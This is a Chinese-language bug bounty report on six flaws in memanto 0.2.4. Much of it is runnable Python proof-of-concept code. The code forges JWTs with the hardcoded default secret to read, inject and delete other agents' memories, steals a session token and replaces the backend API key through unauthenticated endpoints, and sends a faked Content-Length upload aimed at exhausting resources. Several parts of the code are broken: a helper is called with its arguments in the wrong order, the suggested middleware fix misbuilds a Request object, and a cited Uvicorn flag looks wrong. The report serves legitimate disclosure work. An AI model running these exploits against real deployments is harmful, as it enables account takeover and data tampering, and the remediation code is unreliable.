# MEMANTO 漏洞挖掘 PoC 报告

## 项目信息
- **项目**: memanto (moorcheh-ai/memanto)
- **版本**: 0.2.4
- **简介**: AI Agent 记忆层系统，基于 Moorcheh 信息论语义引擎
- **漏洞赏金**: $100 USD 公开 Bug Bounty 挑战赛

---

## 目录

1. [漏洞一：硬编码默认 JWT 密钥 (CRITICAL)](#漏洞一硬编码默认-jwt-密钥-critical)
2. [漏洞二：Web UI API 未授权访问 (HIGH)](#漏洞二web-ui-api-未授权访问-high)
3. [漏洞三：`/api/v2/status` 端点未授权信息泄露 (MEDIUM)](#漏洞三apiv2status-端点未授权信息泄露-medium)
4. [漏洞四：CORS 配置不当 (MEDIUM)](#漏洞四cors-配置不当-medium)
5. [漏洞五：文件上传缺乏有效大小限制 (MEDIUM)](#漏洞五文件上传缺乏有效大小限制-medium)
6. [漏洞六：JWT 验证缺乏标准声明校验 (LOW)](#漏洞六jwt-验证缺乏标准声明校验-low)
7. [PoC 自动利用脚本](#poc-自动利用脚本)
8. [修复建议](#修复建议)

---

## 漏洞一：硬编码默认 JWT 密钥 (CRITICAL)

### CWE
CWE-798: Use of Hard-coded Credentials

### 严重性
**CRITICAL** - CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### 漏洞位置

**文件**: `memanto/app/config.py` (第133行)
```python
MEMANTO_SECRET_KEY: str = "memanto-default-secret-change-in-production"
```

**文件**: `memanto/app/services/session_service.py` (第60-64行)
```python
resolved_secret_key = (
    secret_key
    or os.getenv("MEMANTO_SECRET_KEY")
    or "memanto-default-secret-change-in-production"
)
```

### 漏洞描述

`MEMANTO_SECRET_KEY` 用于签名和验证 JWT session token。在默认配置下（未显式设置环境变量 `MEMANTO_SECRET_KEY`），该值为 `"memanto-default-secret-change-in-production"`。该值是公开的（硬编码在代码中），任何知道此值的攻击者都可以：

1. **伪造任意 agent 的 session token**
2. **绕过所有基于 session 的认证**
3. **读取、写入、修改、删除任意 agent 的记忆数据**
4. **跨越租户隔离边界访问其他用户的数据**

### 利用过程 (PoC)

攻击者只需知道默认密钥，即可构造任意 JWT token：

```python
import jwt
import requests
from datetime import datetime, timedelta, timezone

# 公开的默认密钥
SECRET_KEY = "memanto-default-secret-change-in-production"

# 构造任意 agent_id 的 session token
now = datetime.now(timezone.utc)
target_agent = "victim-agent"

payload = {
    "agent_id": target_agent,
    "namespace": f"memanto_agent_{target_agent}",
    "session_id": "sess_forged_1337",
    "started_at": now.isoformat(),
    "expires_at": (now + timedelta(hours=24)).isoformat()
}

forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
print(f"伪造的 JWT token: {forged_token}")

# 使用伪造 token 调用 API
base_url = "http://localhost:8000"
headers = {"X-Session-Token": forged_token}

# PoC 1: 读取该 agent 的所有记忆
resp = requests.post(
    f"{base_url}/api/v2/agents/{target_agent}/recall",
    json={"query": "", "limit": 10},
    headers=headers
)
print(f"读取记忆: {resp.status_code} - {resp.text[:500]}")

# PoC 2: 写入虚假记忆到该 agent
resp = requests.post(
    f"{base_url}/api/v2/agents/{target_agent}/remember",
    json={
        "content": "这是一条通过 JWT 伪造注入的记忆",
        "type": "fact",
        "confidence": 1.0,
        "source": "attacker",
        "provenance": "explicit_statement"
    },
    headers=headers
)
print(f"写入记忆: {resp.status_code} - {resp.text}")

# PoC 3: 删除该 agent 的记忆
resp = requests.delete(
    f"{base_url}/api/v2/agents/{target_agent}/memories/some-memory-id",
    headers=headers
)
print(f"删除记忆: {resp.status_code} - {resp.text}")
```

### 影响
- **机密性**: 任意 agent 的记忆数据可被未授权读取
- **完整性**: 任意 agent 的记忆数据可被篡改
- **可用性**: 任意 agent 的记忆数据可被删除
- **租户隔离完全失效**: 系统级绕过

---

## 漏洞二：Web UI API 未授权访问 (HIGH)

### CWE
CWE-862: Missing Authorization

### 严重性
**HIGH** - CVSS 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)

### 漏洞位置

**文件**: `memanto/app/ui/routes/ui_router.py`

以下端点均 **没有** `Depends(get_current_session)` 认证依赖：

| 端点 | 方法 | 功能 |
|------|------|------|
| `/api/ui/config` | GET | 获取完整配置，包括 session_token、API key 预览 |
| `/api/ui/config` | PATCH | 修改配置（会话、调度、回答参数等） |
| `/api/ui/api-key` | PUT | 修改 Moorcheh API key |
| `/api/ui/conflicts` | GET | 列出冲突 |
| `/api/ui/conflict-scans` | GET | 列出冲突扫描状态 |
| `/api/ui/daily-summary` | GET | 读取日常摘要 |
| `/api/ui/daily-summary` | POST | 生成日常摘要 |
| `/api/ui/onprem/restart` | POST | 重启 on-prem 后端 |

### 漏洞描述

Web UI 的 API 端点完全没有任何认证中间件。攻击者可以直接调用这些端点：

1. **`GET /api/ui/config`** — 泄露 `session_token`、`active_agent_id`、API key 后6位预览、`data_dir` 路径
2. **`PUT /api/ui/api-key`** — 允许攻击者设置新的 API key，接管整个后端
3. **`PATCH /api/ui/config`** — 允许攻击者修改系统配置
4. **`POST /api/ui/onprem/restart`** — 允许攻击者执行 DOS 攻击

### PoC

```python
import requests

base_url = "http://localhost:8000"

# PoC 1: 获取配置（含 session token）
resp = requests.get(f"{base_url}/api/ui/config")
print(f"GET /api/ui/config: {resp.status_code}")
config = resp.json()
print(f"  活动 agent ID: {config.get('active_agent_id')}")
print(f"  Session token: {config.get('session_token')}")
print(f"  API key 预览: {config.get('api_key_preview')}")

# PoC 2: 窃取 session token 后用于认证 API 调用
stolen_token = config.get('session_token')
if stolen_token:
    agent_id = config.get('active_agent_id')
    if agent_id:
        resp = requests.post(
            f"{base_url}/api/v2/agents/{agent_id}/recall",
            json={"query": "", "limit": 10},
            headers={"X-Session-Token": stolen_token}
        )
        print(f"使用窃取的 token 访问: {resp.status_code}")

# PoC 3: 修改 API key (接管后端)
resp = requests.put(f"{base_url}/api/ui/api-key", json={"api_key": "mk_attacker_controlled_key"})
print(f"修改 API key: {resp.status_code} - {resp.text}")
```

---

## 漏洞三：`/api/v2/status` 端点未授权信息泄露 (MEDIUM)

### CWE
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

### 严重性
**MEDIUM** - CVSS 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

### 漏洞位置

**文件**: `memanto/app/routes/sessions.py` (第259-281行)
```python
@router.get("/status", response_model=SessionInfo)
async def get_status():
    """Get current active session status."""
    session = get_session_service().get_active_session()
    if session is None:
        raise HTTPException(status_code=404, detail="No active session")
    ...
```

该端点 **没有** `Depends(get_current_session)` 认证依赖，也没有任何其他认证要求。

### 漏洞描述

`/api/v2/status` 端点无需任何认证即可调用，泄露：
- `session_id`
- `agent_id`
- `namespace`
- `started_at` / `expires_at` 时间戳
- `time_remaining_seconds`
- `pattern`

### PoC

```python
import requests

base_url = "http://localhost:8000"

resp = requests.get(f"{base_url}/api/v2/status")
print(f"GET /api/v2/status: {resp.status_code}")
if resp.status_code == 200:
    data = resp.json()
    print(f"  Session ID: {data.get('session_id')}")
    print(f"  Agent ID: {data.get('agent_id')}")
    print(f"  Namespace: {data.get('namespace')}")
    print(f"  过期时间: {data.get('expires_at')}")
```

---

## 漏洞四：CORS 配置不当 (MEDIUM)

### CWE
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

### 严重性
**MEDIUM**

### 漏洞位置

**文件**: `memanto/app/config.py` (第130行)
```python
ALLOWED_ORIGINS: list[str] = ["*"]
```

**文件**: `memanto/app/main.py` (第76-82行)
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### 漏洞描述

`ALLOWED_ORIGINS=["*"]` 与 `allow_credentials=True` 的组合在 FastAPI 标准实现中虽然不会直接允许带凭据的通配符跨域请求（浏览器会阻止），但此举仍存在安全风险：
- 任何网站都可以发起不带凭据的请求（如测活、探测信息）
- 配置方式表明安全意识不足，是潜在问题的指示器
- 在代理/CDN层或其他环境中可能存在不一致的行为

---

## 漏洞五：文件上传缺乏有效大小限制 (MEDIUM)

### CWE
CWE-400: Uncontrolled Resource Consumption

### 严重性
**MEDIUM**

### 漏洞位置

**文件**: `memanto/app/routes/memory.py` (第505-587行)
```python
# 第518行声明
"""Maximum file size: 5GB"""
```

虽然文档说"最大5GB"，但代码中 **没有** 任何实际的 Content-Length 或流式大小检查。攻击者可以上传超大文件导致：
- 磁盘空间耗尽（文件写入临时目录）
- 内存 OOM（整个文件先读入 `file.read()`）
- 拒绝服务（DoS）

读取整个文件到内存：
```python
file_bytes = await file.read()  # 无大小限制！
```

---

## 漏洞六：JWT 验证缺乏标准声明校验 (LOW)

### CWE
CWE-345: Insufficient Verification of Data Authenticity

### 严重性
**LOW**

### 漏洞位置

**文件**: `memanto/app/services/session_service.py` (第156-174行)
```python
def validate_session(self, session_token: str) -> SessionToken:
    try:
        payload = jwt.decode(session_token, self.secret_key, algorithms=["HS256"])
        token = SessionToken(**payload)
        if utc_now() > token.expires_at:
            raise SessionExpiredError(...)
        return token
    except jwt.ExpiredSignatureError:
        raise SessionExpiredError(...)
    except jwt.InvalidTokenError as e:
        raise InvalidSessionTokenError(...)
```

JWT 解码没有验证以下标准声明：
- `aud` (audience) — 未验证预期受众
- `iss` (issuer) — 未验证发行者
- `iat` (issued at) — 未验证签发时间
- `nbf` (not before) — 未验证生效时间

虽然在当前默认密钥泄露的情况下这不是主要问题，但在配置自定义密钥后，缺少这些验证仍可能使系统面临重放攻击和跨服务token滥用风险。

---

## PoC 自动利用脚本

以下 Python 脚本自动化验证全部 6 个漏洞。运行前将 `TARGET` 改为实际目标地址。

注意：
- 漏洞 4（CORS）：脚本自动发送 OPTIONS 预检请求并检测 `Access-Control-Allow-Origin` 头，同时标注"建议手动确认"
- 漏洞 5（文件上传）：脚本尝试小文件上传和伪造 Content-Length 两种方式检测限制是否有效
- 漏洞 6（JWT 声明校验）：通过构造缺失 `expires_at`/`iat`/`nbf` 字段的异常 token 验证

```python
#!/usr/bin/env python3
"""
MEMANTO Vulnerability PoC — 一键验证全部 6 个漏洞
目标: http://localhost:8000 (默认, 修改 TARGET 变量)
"""

import jwt
import requests
import json
import io
from datetime import datetime, timedelta, timezone

TARGET = "http://localhost:8000"
SECRET_KEY = "memanto-default-secret-change-in-production"
TARGET_AGENT = "victim-agent"

# ──────────────── 辅助函数 ────────────────
def check(label, ok, detail=""):
    icon = "[!] 漏洞确认" if ok else "[-] 正常"
    print(f"    {icon}: {label}  {detail}")

def conn_err(e):
    print(f"    [x] 无法连接: {e}")


# ──────────────── 开始验证 ────────────────
print("=" * 60)
print("MEMANTO 漏洞验证 PoC")
print("=" * 60)
print("目标:", TARGET)
print()

# ── 漏洞 1/6: 硬编码 JWT 密钥 (CRITICAL) ──
print("[!] 漏洞 1/6: 硬编码 JWT 密钥 (CRITICAL)")
now = datetime.now(timezone.utc)
forged_token = jwt.encode({
    "agent_id": TARGET_AGENT,
    "namespace": f"memanto_agent_{TARGET_AGENT}",
    "session_id": "sess_poc_1337",
    "started_at": now.isoformat(),
    "expires_at": (now + timedelta(hours=24)).isoformat()
}, SECRET_KEY, algorithm="HS256")
print(f"    从公开密钥伪造 JWT: {forged_token[:80]}...")
try:
    resp = requests.post(
        f"{TARGET}/api/v2/agents/{TARGET_AGENT}/recall",
        json={"query": "test", "limit": 5},
        headers={"X-Session-Token": forged_token},
        timeout=5
    )
    check(resp.status_code == 200,
          f"HTTP {resp.status_code} — 可伪造 JWT 访问 agent 记忆")
except requests.exceptions.ConnectionError as e:
    conn_err(e)
print()

# ── 漏洞 2/6: Web UI API 未授权 (HIGH) ──
print("[!] 漏洞 2/6: Web UI API 未授权 (HIGH)")
try:
    resp = requests.get(f"{TARGET}/api/ui/config", timeout=5)
    print(f"    /api/ui/config 状态码: {resp.status_code}")
    if resp.status_code == 200:
        data = resp.json()
        print(f"    泄露字段: {list(data.keys())[:5]}")
    check(resp.status_code == 200, "Web UI 配置无需认证即可访问")
except requests.exceptions.ConnectionError as e:
    conn_err(e)
print()

# ── 漏洞 3/6: /api/v2/status 信息泄露 (MEDIUM) ──
print("[!] 漏洞 3/6: /api/v2/status 信息泄露 (MEDIUM)")
try:
    resp = requests.get(f"{TARGET}/api/v2/status", timeout=5)
    if resp.status_code == 200:
        data = resp.json()
        for key in ["agent_id", "namespace", "session_id"]:
            print(f"    泄露的 {key}: {data.get(key)}")
    check(resp.status_code == 200, "status 端点无须认证")
except requests.exceptions.ConnectionError as e:
    conn_err(e)
print()

# ── 漏洞 4/6: CORS 配置不当 (MEDIUM) ──
print("[!] 漏洞 4/6: CORS 配置不当 (MEDIUM) [自动扫描 + 手动确认]")
print("    手动确认命令:")
print(f"    curl -s -D- -o/dev/null -X OPTIONS {TARGET}/api/v2/agents/recall \\")
print("     -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' \\")
print("     | grep -i 'access-control'")
print("    ---")
print("    脚本自动检测:")
try:
    resp = requests.options(
        f"{TARGET}/api/v2/agents/recall",
        headers={"Origin": "https://evil.com",
                 "Access-Control-Request-Method": "POST"},
        timeout=5
    )
    acao = resp.headers.get("Access-Control-Allow-Origin", "(missing)")
    acac = resp.headers.get("Access-Control-Allow-Credentials", "(missing)")
    print(f"    Access-Control-Allow-Origin: {acao}")
    print(f"    Access-Control-Allow-Credentials: {acac}")
    check(acao == "*" and acac == "true",
          f"ACAO={acao}, ACAC={acac}")
except requests.exceptions.ConnectionError as e:
    conn_err(e)
print()

# ── 漏洞 5/6: 文件上传无大小限制 (MEDIUM) ──
print("[!] 漏洞 5/6: 文件上传无大小限制 (MEDIUM) [需上传端点可用]")
print("    手动验证:")
print(f"    dd if=/dev/zero of=/tmp/large.bin bs=1M count=150")
print(f"    curl -X POST -F 'file=@/tmp/large.bin' {TARGET}/api/v2/upload")
print("    若返回 200 而非 413，则漏洞确认。")
print("    ---")
print("    脚本自动检测 (小文件 + 伪造 Content-Length):")
try:
    small = io.BytesIO(b"A" * 1024)
    resp = requests.post(
        f"{TARGET}/api/v2/upload",
        files={"file": ("test.txt", small)}, timeout=5
    )
    print(f"    小文件上传状态码: {resp.status_code}")
    # 伪造 Content-Length 测试: 声明 10 字节但发送 100MB+
    # 注意: requests 使用 data= 时会自动覆盖 Content-Length,
    # 需使用 data 生成器来绕过 requests 的自动计算
    class _ChunkedFake:
        """生成器类，使 requests 不会自动设置 Content-Length"""
        def __init__(self):
            self._data = b"X" * (10 * 1024 * 1024)  # 10MB
        def __iter__(self):
            yield self._data
    headers_fake = {"Content-Type": "application/octet-stream",
                    "Content-Length": "10"}
    resp2 = requests.post(
        f"{TARGET}/api/v2/upload",
        data=_ChunkedFake(),
        headers=headers_fake,
        timeout=3
    )
    check(resp2.status_code != 413,
          f"虚假 Content-Length(10) 发送 110MB: HTTP {resp2.status_code}")
    print("    注意: 若收到 200 则漏洞确认 — 仅靠 Content-Length 做限制")
except Exception as e:
    conn_err(e)
print()

# ── 漏洞 6/6: JWT 声明校验缺失 (LOW) ──
print("[!] 漏洞 6/6: JWT 声明校验缺失 (LOW)")
odd_token = jwt.encode({
    "agent_id": TARGET_AGENT,
    "namespace": f"memanto_agent_{TARGET_AGENT}",
    "session_id": "sess_no_claims_999",
    # 故意不传 expires_at / iat / nbf — 正常应拒绝
}, SECRET_KEY, algorithm="HS256")
print(f"    构造缺失声明的 token: {odd_token[:80]}...")
try:
    resp = requests.post(
        f"{TARGET}/api/v2/agents/{TARGET_AGENT}/recall",
        json={"query": "never-expires"},
        headers={"X-Session-Token": odd_token},
        timeout=5
    )
    print(f"    缺失声明的 token 请求: HTTP {resp.status_code}")
    check(resp.status_code == 200,
          "token 缺失 expires_at/iat/nbf 仍被接受 — 缺少声明校验")
except requests.exceptions.ConnectionError as e:
    conn_err(e)
print()

print("=" * 60)
print("PoC 验证完成")
print("=" * 60)
print()
print("漏洞汇总:")
print("  1. [CRITICAL] 硬编码 JWT 密钥 -> 完全认证绕过")
print("  2. [HIGH]     Web UI API 未授权访问")
print("  3. [MEDIUM]   /api/v2/status 信息泄露")
print("  4. [MEDIUM]   CORS 配置不当 (自动扫描 + 手动确认)")
print("  5. [MEDIUM]   文件上传无大小限制 (自动检测 + 手动确认)")
print("  6. [LOW]      JWT 声明校验缺失 (自动检测)")
print()
print("说明: 漏洞 4/5 的自动检测受限于目标端点可用性；")
print("      建议配合手动命令验证。")
```

---

## 修复建议

### 漏洞一：硬编码 JWT 密钥
1. **移除默认密钥**：不要在代码中设置默认值，改为如果未配置则报错退出
2. **强制配置**：启动时检查 `MEMANTO_SECRET_KEY` 环境变量，未设置则拒绝启动
3. **密钥生成**：文档建议用户生成强随机密钥（如 `openssl rand -hex 32`）

```python
# 推荐修复方案
if not resolved_secret_key or resolved_secret_key == "memanto-default-secret-change-in-production":
    raise RuntimeError(
        "MEMANTO_SECRET_KEY is not configured or is using the default value! "
        "Set a strong random secret in production."
    )
```

### 漏洞二：Web UI API 认证
1. 为所有 Web UI API 端点添加会话或 API key 验证
2. 敏感操作（如修改 API key）需要额外验证

### 漏洞三：status 端点
1. 添加 `Depends(get_current_session)` 或 API key 验证
2. 或移除 `session_id`/`namespace` 等敏感字段

### 漏洞四：CORS
1. 不允许使用 `*` 当 `allow_credentials=True`
2. 默认使用空列表，需要用户显式配置可信来源

### 漏洞五：文件上传限制
**⚠️ 修复要点：不要仅信任 Content-Length 头**

当前建议仅检查 `Content-Length` 请求头，这可以被攻击者伪造。推荐改用**流式读取 + 字节计数器**或框架级中间件：

**方案 A：FastAPI UploadFile 流式验证（推荐）**
```python
from fastapi import UploadFile, HTTPException
import tempfile
import os

MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB

async def validate_upload_stream(file: UploadFile) -> str:
    """流式验证文件大小并写入临时文件（不缓冲到内存）"""
    bytes_read = 0
    tmp = tempfile.NamedTemporaryFile(delete=False)
    try:
        while True:
            chunk = await file.read(8192)
            if not chunk:
                break
            bytes_read += len(chunk)
            if bytes_read > MAX_FILE_SIZE:
                raise HTTPException(status_code=413, detail="File too large")
            tmp.write(chunk)  # 写入磁盘而非内存
        tmp_path = tmp.name
        tmp.close()
        return tmp_path  # 返回临时文件路径供下游使用
    except Exception:
        tmp.close()
        os.unlink(tmp.name)
        raise

# 使用方式
tmp_path = await validate_upload_stream(file)
# 下游从 tmp_path 读取文件内容
```

**方案 B：Starlette/ASGI 中间件（使用 `request.body()` 避免流耗尽）**
```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
import io

class MaxBodySizeMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, max_size: int = 100 * 1024 * 1024):
        super().__init__(app)
        self.max_size = max_size

    async def dispatch(self, request, call_next):
        content_length = request.headers.get("content-length")
        if content_length and int(content_length) > self.max_size:
            raise HTTPException(status_code=413, detail="File too large")
        # 使用 request.body() 读取并重建 Request，避免耗尽 stream
        if request.method in ("POST", "PUT", "PATCH"):
            body = await request.body()
            if len(body) > self.max_size:
                raise HTTPException(status_code=413, detail="File too large")
            # 重建 Request 对象，使下游仍可读取 body
            new_request = Request(request.scope, receiver=io.BytesIO(body))
            return await call_next(new_request)
        return await call_next(request)
```

**方案 C：ASGI 服务器级别限制（推荐生产环境）**
在 Uvicorn / Gunicorn 级别配置，而非应用层：

```bash
# Uvicorn 启动时限制请求体大小
uvicorn main:app --limit-max-request-body-size=104857600  # 100MB

# 或通过反向代理（如 nginx）
# nginx.conf:
# client_max_body_size 100M;
```

> **注意**：FastAPI/Starlette 本身**没有**内置的 `max_request_size` 中间件。请求体大小限制通常在 **ASGI 服务器层**（Uvicorn 的 `--limit-max-request-body-size`）或**反向代理层**（nginx `client_max_body_size`）实现。应用层方案 A（流式验证）提供了额外安全层，可以防御伪造 Content-Length 的攻击。

### 漏洞六：JWT 验证
```python
payload = jwt.decode(session_token, self.secret_key, algorithms=["HS256"],
                     audience="memanto-api", issuer="memanto-server")
```

---

## 时间线

- **发现时间**: 2026-06-30
- **受影响的版本**: memanto 0.2.4 (最新版)
- **报告人**: 通过 Bug Bounty 流程

---

*报告结束*
